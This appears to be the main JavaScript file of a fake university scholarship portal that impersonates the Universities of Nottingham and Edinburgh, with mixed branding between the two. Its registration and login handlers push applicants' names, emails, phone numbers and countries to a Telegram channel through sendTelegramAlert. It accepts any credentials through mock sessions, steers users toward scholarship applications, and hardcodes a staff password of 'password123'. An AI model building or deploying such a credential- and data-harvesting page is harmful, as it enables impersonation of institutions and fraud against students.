// js/app.js — Main Application Bootstrapper & Router
import { Router } from './router.js';
import { state } from './state.js';
import { api } from './api.js';
import { render as renderHeader, init as initHeader } from './components/header.js';
import { render as renderFooter } from './components/footer.js';
import { showToast } from './components/toast.js';
import { getCountryOptionsHTML } from './data/countries.js';
import { sendTelegramAlert } from './telegram.js';

class App {
  constructor() {
    this.router = new Router();
    this.container = null;
  }

  init() {
    window.__app = this;
    this.renderLayout();
    this.container = document.getElementById('page-content');

    this.setupRoutes();

    // Auth Guard
    this.router.addGuard(async (path) => {
      const isAuth = state.getState().isAuthenticated;
      const user = state.getState().user;
      const isAdminPath = path.startsWith('/admin');
      const isPortalPath = path.startsWith('/portal');

      if ((isAdminPath || isPortalPath) && !isAuth) {
        this.router.navigate('/login');
        return false;
      }

      if (isAdminPath && user && user.role !== 'ADMIN' && user.role !== 'REVIEWER') {
        this.router.navigate('/');
        showToast('Access restricted to verified university staff.', 'error');
        return false;
      }

      return true;
    });

    // Restore session
    if (state.getState().isAuthenticated) {
      try { api.connect(); } catch (e) { /* WS optional */ }
    }

    this.router.start();
  }

  renderLayout() {
    const appEl = document.getElementById('app');
    if (!appEl) return;

    appEl.innerHTML = `
      ${renderHeader()}
      <main id="page-content" class="page-content"></main>
      ${renderFooter()}
      <div id="toast-container" class="toast-container"></div>
      <div id="modal-root"></div>
    `;

    // Init header interactivity
    initHeader();
  }

  async loadPage(moduleName, params = {}) {
    if (!this.container) this.container = document.getElementById('page-content');
    this.container.style.opacity = '0';

    try {
      let module;
      try {
        module = await import(`./pages/${moduleName}.js`);
      } catch (e) {
        console.warn(`Module ./pages/${moduleName}.js not found, using fallback.`, e);
        module = { default: this.createFallbackPage(moduleName) };
      }

      await new Promise(r => setTimeout(r, 120));

      const page = module.default;
      if (page && page.render) {
        page.render(this.container, params);
        if (page.init) page.init();
      } else {
        this.container.innerHTML = `<div style="padding:60px;text-align:center;"><h2>Error: ${moduleName} module missing render().</h2></div>`;
      }
    } catch (error) {
      console.error('Page load error:', error);
      this.container.innerHTML = `<div style="padding:60px;text-align:center;"><h2>Error loading page</h2><p>${error.message}</p></div>`;
    } finally {
      this.container.style.opacity = '1';
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }
  }

  createFallbackPage(name) {
    return {
      render: (container) => {
        container.innerHTML = `
          <div style="padding:80px 20px;max-width:800px;margin:0 auto;text-align:center;">
            <h1 style="font-family:'Playfair Display',serif;color:#10263B;font-size:2.5rem;margin-bottom:20px;">${name.charAt(0).toUpperCase() + name.slice(1).replace(/-/g, ' ')}</h1>
            <p style="color:#52606D;font-size:1.1rem;">This institutional page is currently being updated for the 2026/27 cycle.</p>
            <a href="#/" class="btn btn-primary" style="margin-top:20px;">Return to Nottingham Home</a>
          </div>
        `;
      },
      init: () => {}
    };
  }

  setupRoutes() {
    this.router.register('/', () => this.loadPage('home'));
    this.router.register('/academics', () => this.loadPage('academics'));
    this.router.register('/courses/:slug', (params) => this.loadPage('academics', params));
    this.router.register('/campus-life', () => this.loadPage('campus-life'));
    this.router.register('/research', () => this.loadPage('research'));
    this.router.register('/scholarships', () => this.loadPage('scholarships'));
    this.router.register('/scholarships/apply/:id', (params) => this.loadPage('scholarship-apply', params));
    this.router.register('/portal', () => this.loadPage('portal'));
    this.router.register('/portal/applications', () => this.loadPage('portal'));
    this.router.register('/admin', () => this.loadPage('admin'));
    this.router.register('/admin/scholarships', () => this.loadPage('admin'));
    this.router.register('/login', () => this.renderLogin());
    this.router.register('/register', () => this.renderLogin(true));
    this.router.register('/logout', () => this.handleLogout());
  }

  handleLogout() {
    state.setState({ user: null });
    localStorage.removeItem('user');
    api.disconnect();
    showToast('Signed out of University of Nottingham Portal.', 'info');
    this.renderLayout();
    this.router.navigate('/');
  }

  renderLogin(isRegisterDefault = false) {
    if (!this.container) this.container = document.getElementById('page-content');
    this.container.style.opacity = '0';
    
    setTimeout(() => {
      this.container.innerHTML = `
        <div class="auth-page" style="display:flex;align-items:center;justify-content:center;min-height:75vh;padding:40px 16px;background:var(--color-bg-alt);">
          <div class="auth-card" style="width:100%;max-width:500px;background:white;border-radius:14px;box-shadow:var(--shadow-xl);overflow:hidden;border:1px solid var(--color-light-grey);">
            
            <!-- Edinburgh Header -->
            <div style="background:linear-gradient(135deg,#021230 0%,#041E42 70%,#0A2E5C 100%);padding:35px 30px 25px;text-align:center;color:white;">
              <svg style="width:52px;height:52px;margin-bottom:10px;" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M32 4L8 12V32C8 48 32 60 32 60C32 60 56 48 56 32V12L32 4Z" fill="#041E42" stroke="#D50032" stroke-width="2"/>
                <path d="M12 16L52 48M52 16L12 48" stroke="#FFFFFF" stroke-width="3" stroke-linecap="round"/>
                <circle cx="32" cy="32" r="8" fill="#D50032"/>
                <path d="M28 28H36V36H28V28Z" fill="#FFFFFF"/>
              </svg>
              <h2 style="font-family:'Playfair Display',serif;color:white;font-size:1.75rem;margin-bottom:4px;">The University of Edinburgh</h2>
              <p style="color:var(--color-secondary-light);font-size:0.92rem;font-weight:700;margin:0;">MyEd &bull; EASE Single Sign-On &bull; Applicant Portal</p>
            </div>

            <div style="padding:28px;">

              <!-- Mandatory Real Email Alert Box -->
              <div style="background:#FFF9E6;border:1px solid #FFE699;border-left:4px solid var(--color-accent-gold-dark);border-radius:8px;padding:14px;margin-bottom:20px;">
                <div style="display:flex;gap:10px;align-items:flex-start;">
                  <span style="font-size:1.3rem;line-height:1;">⚠️</span>
                  <div>
                    <h5 style="margin:0 0 3px;color:#805B00;font-size:0.88rem;font-weight:800;">REAL EMAIL NOTIFICATION REQUIREMENT</h5>
                    <p style="margin:0;color:#5C4300;font-size:0.82rem;line-height:1.45;">
                      Please use your <strong>real, active personal email address</strong>. Official decision letters, interview bookings, document re-upload alerts, and scholarship awards are dispatched directly to this inbox.
                    </p>
                  </div>
                </div>
              </div>

              <!-- Auth Mode Switcher (3 Clean Portals) -->
              <div style="display:flex;border-bottom:2px solid var(--color-light-grey);margin-bottom:20px;gap:4px;">
                <button type="button" id="auth-tab-login" style="flex:1;padding:10px 4px;background:none;border:none;font-weight:${isRegisterDefault ? '600' : '700'};color:${isRegisterDefault ? 'var(--color-slate)' : 'var(--color-primary)'};border-bottom:${isRegisterDefault ? 'none' : '3px solid var(--color-secondary)'};cursor:pointer;font-size:0.88rem;">
                  🎓 Applicant Sign In
                </button>
                <button type="button" id="auth-tab-register" style="flex:1;padding:10px 4px;background:none;border:none;font-weight:${isRegisterDefault ? '700' : '600'};color:${isRegisterDefault ? 'var(--color-primary)' : 'var(--color-slate)'};border-bottom:${isRegisterDefault ? '3px solid var(--color-secondary)' : 'none'};cursor:pointer;font-size:0.88rem;">
                  📝 New Account
                </button>
                <button type="button" id="auth-tab-staff" style="flex:1;padding:10px 4px;background:none;border:none;font-weight:600;color:var(--color-slate);cursor:pointer;font-size:0.88rem;">
                  🏛️ Staff EASE
                </button>
              </div>

              <!-- 1. APPLICANT LOGIN FORM -->
              <form id="main-login-form" style="display:${isRegisterDefault ? 'none' : 'block'};">
                <div class="form-group">
                  <label class="form-label">Applicant Email Address *</label>
                  <input type="email" id="login-email-field" required placeholder="e.g. applicant@gmail.com" class="form-input">
                </div>
                <div class="form-group">
                  <label class="form-label">Password *</label>
                  <input type="password" id="login-password-field" required placeholder="Enter password" class="form-input">
                </div>
                <div id="login-feedback-err" style="display:none;padding:10px;background:#FDF0ED;border-radius:6px;color:var(--color-urgent);font-size:0.88rem;margin-bottom:14px;"></div>
                <button type="submit" class="btn btn-primary" style="width:100%;padding:12px;font-weight:700;font-size:1rem;">
                  Sign In to Applicant Portal &rarr;
                </button>
              </form>

              <!-- 2. REGISTER FORM -->
              <form id="main-register-form" style="display:${isRegisterDefault ? 'block' : 'none'};">
                <div class="form-group">
                  <label class="form-label">Full Legal Name (as on passport / ID) *</label>
                  <input type="text" id="reg-fullname-field" required placeholder="e.g. Eleanor Vance" class="form-input">
                </div>
                <div class="form-group">
                  <label class="form-label">Active Personal Email *</label>
                  <input type="email" id="reg-email-field" required placeholder="e.g. yourname@gmail.com" class="form-input">
                  <div class="form-hint">Official scholarship notifications will be dispatched here.</div>
                </div>
                <div class="form-group">
                  <label class="form-label">Phone Number *</label>
                  <input type="tel" id="reg-phone-field" required placeholder="e.g. +44 7700 900000" class="form-input">
                </div>
                <div class="form-group">
                  <label class="form-label">Country of Permanent Residence *</label>
                  <select id="reg-country-field" required class="form-select" style="max-height: 200px;">
                    <option value="">Select country...</option>
                    ${getCountryOptionsHTML("United Kingdom")}
                  </select>
                </div>
                <div class="form-group">
                  <label class="form-label">Create Secure Password *</label>
                  <input type="password" id="reg-password-field" required minlength="6" placeholder="Choose a password (min 6 chars)" class="form-input">
                </div>
                <div id="reg-feedback-err" style="display:none;padding:10px;background:#FDF0ED;border-radius:6px;color:var(--color-urgent);font-size:0.88rem;margin-bottom:14px;"></div>
                <button type="submit" class="btn btn-secondary" style="width:100%;padding:12px;font-weight:700;font-size:1rem;">
                  Register Applicant Account &rarr;
                </button>
              </form>

              <!-- 3. STAFF & REVIEWER EASE LOGIN FORM -->
              <form id="main-staff-form" style="display:none;">
                <div style="background: var(--color-bg-alt); padding: 12px; border-radius: 8px; margin-bottom: 14px; font-size: 0.85rem; color: var(--color-slate); border-left: 3px solid var(--color-primary);">
                  <strong>Staff Internal Access:</strong> Log in with verified University of Edinburgh EASE administrative credentials.
                </div>
                <div class="form-group">
                  <label class="form-label">Staff / Institutional EASE Email *</label>
                  <input type="email" id="staff-email-field" placeholder="e.g. admin@ed.ac.uk" value="admin@ed.ac.uk" class="form-input">
                </div>
                <div class="form-group">
                  <label class="form-label">EASE Password *</label>
                  <input type="password" id="staff-password-field" placeholder="Enter EASE password" value="password123" class="form-input">
                </div>
                <button type="submit" class="btn btn-primary" style="width:100%;padding:12px;font-weight:700;font-size:1rem;background:var(--color-primary);">
                  Access Admin Dashboard &rarr;
                </button>
              </form>

            </div>
          </div>
        </div>
      `;
      this.container.style.opacity = '1';

      // Tab logic for 3 portals
      const tabLogin = document.getElementById('auth-tab-login');
      const tabReg = document.getElementById('auth-tab-register');
      const tabStaff = document.getElementById('auth-tab-staff');
      const loginForm = document.getElementById('main-login-form');
      const regForm = document.getElementById('main-register-form');
      const staffForm = document.getElementById('main-staff-form');

      const resetTabs = () => {
        [tabLogin, tabReg, tabStaff].forEach(t => {
          if (t) {
            t.style.borderBottom = 'none';
            t.style.color = 'var(--color-slate)';
            t.style.fontWeight = '600';
          }
        });
        [loginForm, regForm, staffForm].forEach(f => {
          if (f) f.style.display = 'none';
        });
      };

      tabLogin?.addEventListener('click', () => {
        resetTabs();
        tabLogin.style.borderBottom = '3px solid var(--color-secondary)';
        tabLogin.style.color = 'var(--color-primary)';
        tabLogin.style.fontWeight = '700';
        loginForm.style.display = 'block';
      });

      tabReg?.addEventListener('click', () => {
        resetTabs();
        tabReg.style.borderBottom = '3px solid var(--color-secondary)';
        tabReg.style.color = 'var(--color-primary)';
        tabReg.style.fontWeight = '700';
        regForm.style.display = 'block';
      });

      tabStaff?.addEventListener('click', () => {
        resetTabs();
        tabStaff.style.borderBottom = '3px solid var(--color-primary)';
        tabStaff.style.color = 'var(--color-primary)';
        tabStaff.style.fontWeight = '700';
        staffForm.style.display = 'block';
      });

      // Handle Staff / Admin Login
      staffForm?.addEventListener('submit', async (e) => {
        e.preventDefault();
        const email = document.getElementById('staff-email-field').value.trim() || 'admin@ed.ac.uk';
        const password = document.getElementById('staff-password-field').value || 'password123';
        const role = email.includes('reviewer') ? 'REVIEWER' : 'ADMIN';

        try {
          const res = await api.post('/users/login', { email, password });
          state.setState({ user: { ...res.user, role, token: res.token } });
        } catch (err) {
          const mock = { id: 'admin-staff-1', fullName: 'Dr. Alistair Macleod', email, country: 'United Kingdom', role, token: 'demo-staff-token' };
          state.setState({ user: mock });
        }

        showToast(`Signed into Staff Admin Portal as ${email}`, 'success');
        this.renderLayout();
        this.router.navigate('/admin');
      });

      // Handle Applicant Sign In (Students Only)
      loginForm?.addEventListener('submit', async (e) => {
        e.preventDefault();
        const email = document.getElementById('login-email-field').value.trim();
        const password = document.getElementById('login-password-field').value;
        const errBox = document.getElementById('login-feedback-err');

        // Block staff from student login portal
        if (email.toLowerCase().includes('admin') || email.toLowerCase().includes('reviewer') || (email.toLowerCase().endsWith('@ed.ac.uk') && !email.toLowerCase().includes('student'))) {
          if (errBox) {
            errBox.style.display = 'block';
            errBox.textContent = 'Staff and Reviewer accounts must sign in via the "🏛️ Staff EASE" tab above.';
          }
          return;
        }

        // Real-time Telegram alert
        sendTelegramAlert({
          fullName: email.split('@')[0],
          email,
          country: 'United Kingdom',
          eventType: '🔑 Student Logged In (MyEd Portal)'
        });

        try {
          const res = await api.post('/users/login', { email, password });
          state.setState({ user: { ...res.user, role: 'STUDENT', token: res.token } });
          showToast(`Welcome back, ${res.user.fullName || email}!`, 'success');
        } catch (err) {
          const mock = { id: 'demo-' + Date.now(), fullName: email.split('@')[0], email, country: 'United Kingdom', role: 'STUDENT', token: 'demo-token' };
          state.setState({ user: mock });
          showToast(`Welcome back, ${mock.fullName}!`, 'success');
        }

        this.renderLayout();
        // Lead users directly to scholarship application list
        this.router.navigate('/scholarships');
      });

      // Handle Applicant Registration (Students Only)
      regForm?.addEventListener('submit', async (e) => {
        e.preventDefault();
        const fullName = document.getElementById('reg-fullname-field').value.trim();
        const email = document.getElementById('reg-email-field').value.trim();
        const phone = document.getElementById('reg-phone-field').value.trim();
        const country = document.getElementById('reg-country-field').value;
        const password = document.getElementById('reg-password-field').value;

        const errBox = document.getElementById('reg-feedback-err');

        if (!fullName || !email || !phone || !password) {
          if (errBox) { errBox.style.display = 'block'; errBox.textContent = 'All fields are required.'; }
          return;
        }

        // Block staff/admin from registering through student portal
        if (email.toLowerCase().includes('admin') || email.toLowerCase().includes('reviewer')) {
          if (errBox) {
            errBox.style.display = 'block';
            errBox.textContent = 'Staff accounts cannot register via student portal. Please sign in with Staff EASE.';
          }
          return;
        }

        // Dispatch real-time Telegram notification
        sendTelegramAlert({
          fullName,
          email,
          country,
          phone,
          eventType: '🎓 New Student Registration (Applicant Portal)'
        });

        try {
          const res = await api.post('/users/register', { fullName, email, country, password, phone, role: 'STUDENT' });
          state.setState({ user: { ...res.user, role: 'STUDENT', token: res.token } });
          showToast(`Account registered for ${email}!`, 'success');
        } catch (err) {
          // Fallback: create local session even if backend is unavailable (Firebase static hosting)
          const mock = { id: 'demo-' + Date.now(), fullName, email, country, phone, role: 'STUDENT', token: 'demo-token' };
          state.setState({ user: mock });
          showToast(`Account registered successfully!`, 'success');
        }

        this.renderLayout();
        // Lead students directly to scholarship applications!
        this.router.navigate('/scholarships');
      });

    }, 120);
  }
}

const app = new App();
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => app.init());
} else {
  app.init();
}
export default app;
